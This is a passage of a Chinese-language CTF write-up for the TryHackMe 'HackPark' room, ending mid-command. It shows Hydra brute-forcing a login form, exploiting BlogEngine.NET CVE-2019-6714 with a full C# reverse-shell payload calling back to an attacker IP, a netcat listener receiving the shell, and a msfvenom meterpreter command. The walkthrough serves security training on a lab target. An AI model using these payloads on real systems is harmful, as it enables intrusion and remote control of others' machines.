{"title":"HackPark CTF - TryHackMe.com","uid":"b2262541e68f87fb5672c699c612b8ae","slug":"HackPark","date":"2022-03-28T14:30:27.813Z","updated":"2022-04-01T17:44:54.777Z","comments":true,"path":"api/articles/HackPark.json","keywords":null,"cover":"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/hackpark/image_by_url.jpg","content":"<p><a href=\"https://tryhackme.com/room/hackpark\">HarkPark</a>使用Hydra爆破登录网站，搜索漏洞，并利用漏洞升级Windows机器！</p>\n<h1 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h1><p>开启tryhackme靶机，使用Nmap进行服务发现扫描。</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">└─$ sudo nmap 10.10.1.135 -sS -Pn -F --max-retries 0 -T 4 -oA hackpark-port\nStarting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-03-31 09:29 EDT\nWarning: 10.10.1.135 giving up on port because retransmission cap hit (0).\nNmap scan report for 10.10.1.135\nHost is up (0.45s latency).\nNot shown: 98 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n80&#x2F;tcp   open  http\n3389&#x2F;tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 4.48 seconds<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>在扫描结果中，发现靶机开启了http服务，和远程桌面服务。我们首先在浏览器上查看Web服务。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/hackpark/web_index_1.png\" alt=\"web index 1\"><br>打开侧边选项，发现web服务支持登录。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/hackpark/web_index.png\" alt=\"web index\"></p>\n<h1 id=\"Hydra暴力登录\"><a href=\"#Hydra暴力登录\" class=\"headerlink\" title=\"Hydra暴力登录\"></a>Hydra暴力登录</h1><p>打开登录界面，我们需要借助<code>Hydra</code>的<code>http-post-form</code>模块对表单进行暴力登录。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/hackpark/login.png\" alt=\"login\"><br><code>http-post-form</code>: <code>&lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;]</code>,<code>url</code>后的部分分别代表了”登录表单页面路径”:”表单数据”:”失败的错误信息”。这些信息可以在浏览器的开发者工具(F12)中获取。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/hackpark/f12.png\" alt=\"F12\"></p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">hydra -l admin -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt 10.10.1.135 http-post-form &#39;&#x2F;Account&#x2F;login.aspx: VIEWSTATE&#x3D;kn9SQDRdkNXCn%2F1dkTH%2BMRlN4nxR%2F%2F0OAPN9o2J209SAlfrRUqjn0t4C4kzBpc%2F6%2FqrKubzoR17Ky4ovCAITkWHvPvs00b%2FRKSLj%2FKeZNsHgmkMSfDCAWB%2FbYFIklj8Rto6L%2FN3b%2BqnN93Aa8ccovf5z8On2PnF7cNWlfG4YzqH46iMg&amp;__EVENTVALIDATION&#x3D;yefFfeBAZBXvixdER1v%2BX2605meAbWOF0webb4uj58dt5W0roYdxfZj09XAC%2BtFoUGAVswBCho4MHlF8N8vPWGCBjp38Q4JhYxTzzs2D1kQcr6ZuCZnsgvEZZmACtY2ju7159lb17aFy3GxJ2TX1qWuS3bcWBKzTX6KfYeLUK7rGX7Ka&amp;ctl00%24MainContent%24LoginUser%24UserName&#x3D;^USER^&amp;ctl00%24MainContent%24LoginUser%24Password&#x3D;^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton&#x3D;Log+in: Login failed&#39;\n\n# 使用^USER^ 和^PASS^对登录名和密码进行占位<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li><code>-l LOGIN</code>: 指定登录名。</li>\n<li><code>-L File</code>: 从指定文件中加载登录名</li>\n<li><code>-p PASS</code>: 指定登录密码。</li>\n<li><code>-P File</code>：从文件中加载登录密码<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/hackpark/hydra_pass.png\" alt=\"hydra passwd\"><br>爆破成功，登录名和密码分别为<code>admin</code>和<code>1qaz2wsx</code>。</li>\n</ul>\n<details class=\"custom-details\">\n<summary>hydra http-post-form 用法</summary>\n<p><pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">└─$ hydra -U http-post-form\nHydra v9.2 (c) 2021 by van Hauser&#x2F;THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2022-03-31 09:50:55\n\nHelp for module http-post-form:\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\nModule http-post-form requires the page and the parameters for the web form.\n\nBy default this module is configured to follow a maximum of 5 redirections in\na row. It always gathers a new cookie from the same URL without variables\nThe parameters take three &quot;:&quot; separated values, plus optional values.\n(Note: if you need a colon in the option string as value, escape it with &quot;\\:&quot;, but do not escape a &quot;\\&quot; with &quot;\\\\&quot;.)\n\nSyntax:   &lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;]\nFirst is the page on the server to GET or POST to (URL).\nSecond is the POST&#x2F;GET variables (taken from either the browser, proxy, etc.\n with url-encoded (resp. base64-encoded) usernames and passwords being replaced in the\n &quot;^USER^&quot; (resp. &quot;^USER64^&quot;) and &quot;^PASS^&quot; (resp. &quot;^PASS64^&quot;) placeholders (FORM PARAMETERS)\nThird is the string that it checks for an *invalid* login (by default)\n Invalid condition login check can be preceded by &quot;F&#x3D;&quot;, successful condition\n login check must be preceded by &quot;S&#x3D;&quot;.\n This is where most people get it wrong. You have to check the webapp what a\n failed string looks like and put it in this parameter!\nThe following parameters are optional:\n (c|C)&#x3D;&#x2F;page&#x2F;uri     to define a different page to gather initial cookies from\n (g|G)&#x3D;              skip pre-requests - only use this when no pre-cookies are required\n (h|H)&#x3D;My-Hdr\\: foo   to send a user defined HTTP header with each request\n                 ^USER[64]^ and ^PASS[64]^ can also be put into these headers!\n                 Note: &#39;h&#39; will add the user-defined header at the end\n                 regardless it&#39;s already being sent by Hydra or not.\n                 &#39;H&#39; will replace the value of that header if it exists, by the\n                 one supplied by the user, or add the header at the end\nNote that if you are going to put colons (:) in your headers you should escape them with a backslash (\\).\n All colons that are not option separators should be escaped (see the examples above and below).\n You can specify a header without escaping the colons, but that way you will not be able to put colons\n in the header value itself, as they will be interpreted by hydra as option separators.\n\nExamples:\n &quot;&#x2F;login.php:user&#x3D;^USER^&amp;pass&#x3D;^PASS^:incorrect&quot;\n &quot;&#x2F;login.php:user&#x3D;^USER64^&amp;pass&#x3D;^PASS64^&amp;colon&#x3D;colon\\:escape:S&#x3D;authlog&#x3D;.*success&quot;\n &quot;&#x2F;login.php:user&#x3D;^USER^&amp;pass&#x3D;^PASS^&amp;mid&#x3D;123:authlog&#x3D;.*failed&quot;\n &quot;&#x2F;:user&#x3D;^USER&amp;pass&#x3D;^PASS^:failed:H&#x3D;Authorization\\: Basic dT1w:H&#x3D;Cookie\\: sessid&#x3D;aaaa:h&#x3D;X-User\\: ^USER^:H&#x3D;User-Agent\\: wget&quot;\n &quot;&#x2F;exchweb&#x2F;bin&#x2F;auth&#x2F;owaauth.dll:destination&#x3D;http%3A%2F%2F&lt;target&gt;%2Fexchange&amp;flags&#x3D;0&amp;username&#x3D;&lt;domain&gt;%5C^USER^&amp;password&#x3D;^PASS^&amp;SubmitCreds&#x3D;x&amp;trusted&#x3D;0:reason&#x3D;:C&#x3D;&#x2F;exchweb&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<div class=\"custom-quote tip\">\n<span class=\"custom-quote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M20.86 14.13C20 14.7 19.56 15.74 19.77 16.76C20.13 18.55 18.55 20.13 16.76 19.77C15.74 19.57 14.7 20 14.13 20.86C13.12 22.38 10.89 22.38 9.88 20.86C9.3 20 8.26 19.56 7.24 19.77C5.45 20.13 3.87 18.55 4.23 16.76C4.43 15.74 4 14.7 3.14 14.13C1.62 13.12 1.62 10.89 3.14 9.88C4 9.3 4.44 8.26 4.23 7.24C3.87 5.45 5.45 3.87 7.24 4.23C8.26 4.44 9.3 4 9.87 3.14C10.88 1.62 13.11 1.62 14.12 3.14C14.7 4 15.74 4.44 16.76 4.23C18.55 3.87 20.13 5.45 19.77 7.24C19.56 8.26 20 9.3 20.86 9.87C22.38 10.88 22.38 13.12 20.86 14.13Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M12.01 15C12.01 14.5 12.01 14.5 12.01 14.5C12.04 13.75 13 13.46 14.04 12.2C14.41 11.74 14.69 11.41 14.86 10.85C15.15 9.95 14.92 9.18 14.86 9.02C14.8 8.79 14.52 8 13.72 7.46C13.06 7.02 12.42 7 12.14 7C11.9 7 11.36 7 10.78 7.3C10.28 7.56 9.98 7.9 9.83 8.1C9.24 8.82 9.06 9.63 9 10.06\"></path>\n<path stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M11.99 18H12.01\"></path>\n</svg></span>\n<p class=\"custom-quote-title\">提示</p>\n<p>Hydra 是一个并行化、快速和灵活的登录破解器。它默认在Kali linux上集成。</p>\n</div>\n<h1 id=\"漏洞攻击\"><a href=\"#漏洞攻击\" class=\"headerlink\" title=\"漏洞攻击\"></a>漏洞攻击</h1><p>登录成功后，查看服务的<code>about</code>选项，发现了服务名称和版本号。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/hackpark/blogengine.png\" alt=\"blogengine\"><br>在漏洞库查找该服务版本是否存在漏洞:<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/hackpark/google_exploit.png\" alt=\"exploit db\"><br>也可以使用<code>searchsploit</code>查找漏洞:</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">\n└─$ searchsploit blogengine\n------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------\n Exploit Title                                                                                                                                                                                        |  Path\n------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------\nBlogEngine 3.3 - &#39;syndication.axd&#39; XML External Entity Injection                                                                                                                                      | xml&#x2F;webapps&#x2F;48422.txt\nBlogEngine 3.3 - XML External Entity Injection                                                                                                                                                        | windows&#x2F;webapps&#x2F;46106.txt\nBlogEngine 3.3.8 - &#39;Content&#39; Stored XSS                                                                                                                                                               | aspx&#x2F;webapps&#x2F;48999.txt\nBlogEngine.NET 1.4 - &#39;search.aspx&#39; Cross-Site Scripting                                                                                                                                               | asp&#x2F;webapps&#x2F;32874.txt\nBlogEngine.NET 1.6 - Directory Traversal &#x2F; Information Disclosure                                                                                                                                     | asp&#x2F;webapps&#x2F;35168.txt\nBlogEngine.NET 3.3.6 - Directory Traversal &#x2F; Remote Code Execution                                                                                                                                    | aspx&#x2F;webapps&#x2F;46353.cs\nBlogEngine.NET 3.3.6&#x2F;3.3.7 - &#39;dirPath&#39; Directory Traversal &#x2F; Remote Code Execution                                                                                                                    | aspx&#x2F;webapps&#x2F;47010.py\nBlogEngine.NET 3.3.6&#x2F;3.3.7 - &#39;path&#39; Directory Traversal                                                                                                                                               | aspx&#x2F;webapps&#x2F;47035.py\nBlogEngine.NET 3.3.6&#x2F;3.3.7 - &#39;theme Cookie&#39; Directory Traversal &#x2F; Remote Code Execution                                                                                                               | aspx&#x2F;webapps&#x2F;47011.py\nBlogEngine.NET 3.3.6&#x2F;3.3.7 - XML External Entity Injection                                                                                                                                            | aspx&#x2F;webapps&#x2F;47014.py\n------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------\nShellcodes: No Results<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>我们选择可以执行远程代码的”BlogEngine.NET 3.3.6 - Directory Traversal &#x2F; Remote Code Execution”<a href=\"https://www.exploit-db.com/exploits/46353\">(CVE-2019-6714)</a>漏洞，进行攻击。</p>\n<details class=\"custom-details\">\n<summary>CVE-2019-6714 描述</summary>\n<p>路径遍历漏洞，导致远程代码执行。这个漏洞影响BlogEngine。NET版本3.3.6及以下。这是由未选中的“theme”参数引起的，该参数用于覆盖呈现博客页面的默认主题。<br>漏洞代码:<code>/Custom/Controls/PostList.ascx.cs</code>。</p>\n<p>漏洞攻击：</p>\n<ul>\n<li>首先，修改方法中TCP Client的地址和端口，建立一个反向TCP监听器等待连接。</li>\n<li>然后，上传修改好的文件(在BlogEngine3.3.6版本中，通过编辑文章功能，上传文件路径为<code>http://10.10.1.135/admin/editor/editpost.cshtml</code>)。文件名称必须为<code>PostView.ascx</code>,该文件会存在<code>/App_Data/files</code>下。</li>\n<li>最后，访问<code>http://10.10.1.135/?theme-../../App_Data/files</code>获取反向TCP连接。</li>\n</ul>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ Control Language<span class=\"token operator\">=</span><span class=\"token string\">\"C#\"</span> AutoEventWireup<span class=\"token operator\">=</span><span class=\"token string\">\"true\"</span> EnableViewState<span class=\"token operator\">=</span><span class=\"token string\">\"false\"</span> Inherits<span class=\"token operator\">=</span><span class=\"token string\">\"BlogEngine.Core.Web.Controls.PostViewBase\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ Import Namespace<span class=\"token operator\">=</span><span class=\"token string\">\"BlogEngine.Core\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">></span>\n\n<span class=\"token operator\">&lt;</span>script runat<span class=\"token operator\">=</span><span class=\"token string\">\"server\"</span><span class=\"token operator\">></span>\n\t<span class=\"token keyword\">static</span> System<span class=\"token punctuation\">.</span><span class=\"token constant\">IO</span><span class=\"token punctuation\">.</span>StreamWriter streamWriter<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">protected</span> override <span class=\"token keyword\">void</span> <span class=\"token function\">OnLoad</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">EventArgs e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        base<span class=\"token punctuation\">.</span><span class=\"token function\">OnLoad</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token function\">using</span><span class=\"token punctuation\">(</span>System<span class=\"token punctuation\">.</span>Net<span class=\"token punctuation\">.</span>Sockets<span class=\"token punctuation\">.</span>TcpClient client <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">System<span class=\"token punctuation\">.</span>Net<span class=\"token punctuation\">.</span>Sockets<span class=\"token punctuation\">.</span>TcpClient</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"10.10.10.20\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4445</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">using</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">System<span class=\"token punctuation\">.</span><span class=\"token constant\">IO</span><span class=\"token punctuation\">.</span>Stream stream <span class=\"token operator\">=</span> client<span class=\"token punctuation\">.</span><span class=\"token function\">GetStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token function\">using</span><span class=\"token punctuation\">(</span>System<span class=\"token punctuation\">.</span><span class=\"token constant\">IO</span><span class=\"token punctuation\">.</span>StreamReader rdr <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">System<span class=\"token punctuation\">.</span>IO<span class=\"token punctuation\">.</span>StreamReader</span><span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t\tstreamWriter <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">System<span class=\"token punctuation\">.</span>IO<span class=\"token punctuation\">.</span>StreamWriter</span><span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t\n\t\t\t\tStringBuilder strInput <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">StringBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t\t\t\tSystem<span class=\"token punctuation\">.</span>Diagnostics<span class=\"token punctuation\">.</span>Process p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">System<span class=\"token punctuation\">.</span>Diagnostics<span class=\"token punctuation\">.</span>Process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\tp<span class=\"token punctuation\">.</span>StartInfo<span class=\"token punctuation\">.</span>FileName <span class=\"token operator\">=</span> <span class=\"token string\">\"cmd.exe\"</span><span class=\"token punctuation\">;</span>\n\t\t\t\tp<span class=\"token punctuation\">.</span>StartInfo<span class=\"token punctuation\">.</span>CreateNoWindow <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n\t\t\t\tp<span class=\"token punctuation\">.</span>StartInfo<span class=\"token punctuation\">.</span>UseShellExecute <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n\t\t\t\tp<span class=\"token punctuation\">.</span>StartInfo<span class=\"token punctuation\">.</span>RedirectStandardOutput <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n\t\t\t\tp<span class=\"token punctuation\">.</span>StartInfo<span class=\"token punctuation\">.</span>RedirectStandardInput <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n\t\t\t\tp<span class=\"token punctuation\">.</span>StartInfo<span class=\"token punctuation\">.</span>RedirectStandardError <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n\t\t\t\tp<span class=\"token punctuation\">.</span>OutputDataReceived <span class=\"token operator\">+=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">System<span class=\"token punctuation\">.</span>Diagnostics<span class=\"token punctuation\">.</span>DataReceivedEventHandler</span><span class=\"token punctuation\">(</span>CmdOutputDataHandler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\tp<span class=\"token punctuation\">.</span><span class=\"token function\">Start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\tp<span class=\"token punctuation\">.</span><span class=\"token function\">BeginOutputReadLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t\t\t\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t\t\tstrInput<span class=\"token punctuation\">.</span><span class=\"token function\">Append</span><span class=\"token punctuation\">(</span>rdr<span class=\"token punctuation\">.</span><span class=\"token function\">ReadLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\tp<span class=\"token punctuation\">.</span>StandardInput<span class=\"token punctuation\">.</span><span class=\"token function\">WriteLine</span><span class=\"token punctuation\">(</span>strInput<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\tstrInput<span class=\"token punctuation\">.</span><span class=\"token function\">Remove</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> strInput<span class=\"token punctuation\">.</span>Length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n    \t<span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">CmdOutputDataHandler</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">object sendingProcess<span class=\"token punctuation\">,</span> System<span class=\"token punctuation\">.</span>Diagnostics<span class=\"token punctuation\">.</span>DataReceivedEventArgs outLine</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n   \tStringBuilder strOutput <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">StringBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n       \t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>String<span class=\"token punctuation\">.</span><span class=\"token function\">IsNullOrEmpty</span><span class=\"token punctuation\">(</span>outLine<span class=\"token punctuation\">.</span>Data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n       \t\t<span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>\n                \tstrOutput<span class=\"token punctuation\">.</span><span class=\"token function\">Append</span><span class=\"token punctuation\">(</span>outLine<span class=\"token punctuation\">.</span>Data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    \tstreamWriter<span class=\"token punctuation\">.</span><span class=\"token function\">WriteLine</span><span class=\"token punctuation\">(</span>strOutput<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    \tstreamWriter<span class=\"token punctuation\">.</span><span class=\"token function\">Flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>Exception err<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>asp<span class=\"token operator\">:</span>PlaceHolder <span class=\"token constant\">ID</span><span class=\"token operator\">=</span><span class=\"token string\">\"phContent\"</span> runat<span class=\"token operator\">=</span><span class=\"token string\">\"server\"</span> EnableViewState<span class=\"token operator\">=</span><span class=\"token string\">\"false\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>asp<span class=\"token operator\">:</span>PlaceHolder<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>上传修改好的攻击脚本，并上传到服务中。\n</details>\n<p><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/hackpark/blogengine_upload.png\" alt=\"blogengine upload\"><br>打开<code>NetCat</code>监听，并访问<code>http://10.10.1.135/?theme-../../App_Data/files</code>,获取反向TCP连接。</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">└─$ rlwrap nc -lvnp 4445\nNcat: Version 7.92 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )\nNcat: Listening on :::4445\nNcat: Listening on 0.0.0.0:4445\nNcat: Connection from 10.10.1.135.\nNcat: Connection from 10.10.1.135:49353.\nMicrosoft Windows [Version 6.3.9600]\n(c) 2013 Microsoft Corporation. All rights reserved.\nc:\\windows\\system32\\inetsrv&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"MetaSploit提权\"><a href=\"#MetaSploit提权\" class=\"headerlink\" title=\"MetaSploit提权\"></a>MetaSploit提权</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>使用MetaSploit进行权限升级，首先需要获取Meterpreter会话，并使用它来获取靶机上潜在的漏洞。最终利用漏洞提升权限。</p></blockquote>\n<h2 id=\"切换至meterpreter会话\"><a href=\"#切换至meterpreter会话\" class=\"headerlink\" title=\"切换至meterpreter会话\"></a>切换至meterpreter会话</h2><p>使用<code>msfvenom</code>生成恶意程序,并开启http服务。</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">└─$ msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp    LHOST&#x3D;10.4.63.84 LPORT&#x3D;5555 -f exe -o .&#x2F;reverse_5555.exe\n[-] No platform was selected, choosing 